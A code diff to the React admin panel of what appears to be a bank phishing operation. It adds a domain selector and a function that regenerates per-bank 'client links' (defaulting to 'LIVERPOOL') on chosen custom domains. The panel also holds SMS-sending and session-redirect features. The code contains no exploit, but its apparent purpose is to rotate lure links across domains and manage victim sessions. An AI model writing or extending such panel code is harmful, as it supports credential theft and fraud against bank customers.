@@ -121,6 +121,7 @@ export default function AdminPanel() {
   const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
   const [smsMessage, setSmsMessage] = useState('');
   const [isSendingSms, setIsSendingSms] = useState(false);
+  const [selectedDomainId, setSelectedDomainId] = useState<number | null>(null);
   
   // Estado para modal de redirección
   const [isRedirectDialogOpen, setIsRedirectDialogOpen] = useState(false);
@@ -135,6 +136,21 @@ export default function AdminPanel() {
   const { socket, connected, sendMessage } = useWebSocket("/ws");
 
   // Fetch sessions from API
+  // Consulta para obtener dominios personalizados
+  const { data: customDomains = [] } = useQuery({
+    queryKey: ['/api/custom-domains'],
+    queryFn: async () => {
+      const response = await fetch('/api/custom-domains', {
+        credentials: 'include'
+      });
+      if (!response.ok) {
+        return [];
+      }
+      return response.json();
+    },
+    enabled: user?.role === 'admin'
+  });
+
   // Consulta específica que garantice la obtención de sesiones guardadas
   const { data: initialSessions, isLoading, refetch: refresh } = useQuery({
     queryKey: ['/api/sessions', activeTab],
@@ -239,6 +255,62 @@ export default function AdminPanel() {
       });
     }
   });
+
+  // Función para regenerar enlace con dominio personalizado
+  const regenerateLinkWithDomain = async (domainId: number) => {
+    if (!domainId) {
+      toast({
+        title: "Error",
+        description: "Selecciona un dominio válido",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    try {
+      const bancoParaEnlace = activeBank === 'todos' ? 'LIVERPOOL' : activeBank;
+      
+      const response = await fetch('/api/generate-link-custom', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        credentials: 'include',
+        body: JSON.stringify({
+          banco: bancoParaEnlace,
+          domainId: domainId
+        })
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.message || 'Error al generar enlace');
+      }
+
+      const data = await response.json();
+      
+      setClientLink(data.link);
+      setClientCode(data.code);
+      
+      const selectedDomain = customDomains.find((d: any) => d.id === domainId);
+      
+      toast({
+        title: "Enlace regenerado",
+        description: `Nuevo enlace generado con ${selectedDomain?.name || 'dominio personalizado'}: ${data.code}`
+      });
+
+      // Actualizar la lista de sesiones
+      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
+      
+    } catch (error: any) {
+      console.error('Error regenerating link:', error);
+      toast({
+        title: "Error",
+        description: error.message || "Error al regenerar el enlace",
+        variant: "destructive"
+      });
+    }
+  };
 
   // Socket event handlers
   useEffect(() => {
@@ -860,8 +932,32 @@ export default function AdminPanel() {
               </a>
             </div>
             
-            <div className="flex items-center gap-2">
-              <span className="font-semibold">Liga activa:</span>
+            <div className="flex flex-col md:flex-row md:items-center gap-2">
+              <span className="font-semibold">Dominios disponibles:</span>
+              <div className="flex items-center gap-2">
+                <select 
+                  className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-1 text-sm"
+                  value={selectedDomainId || ''}
+                  onChange={(e) => setSelectedDomainId(e.target.value ? parseInt(e.target.value) : null)}
+                >
+                  <option value="">Seleccionar dominio...</option>
+                  {customDomains
+                    .filter((domain: any) => domain.isActive)
+                    .map((domain: any) => (
+                      <option key={domain.id} value={domain.id}>
+                        {domain.name} ({domain.domain})
+                      </option>
+                    ))
+                  }
+                </select>
+                <button 
+                  className="text-xs text-white bg-[#007bff] hover:bg-blue-700 px-3 py-1 rounded disabled:opacity-50"
+                  onClick={() => selectedDomainId && regenerateLinkWithDomain(selectedDomainId)}
+                  disabled={!selectedDomainId}
+                >
+                  Regenerar
+                </button>
+              </div>
               {clientLink && (
                 <a 
                   href={clientLink} 
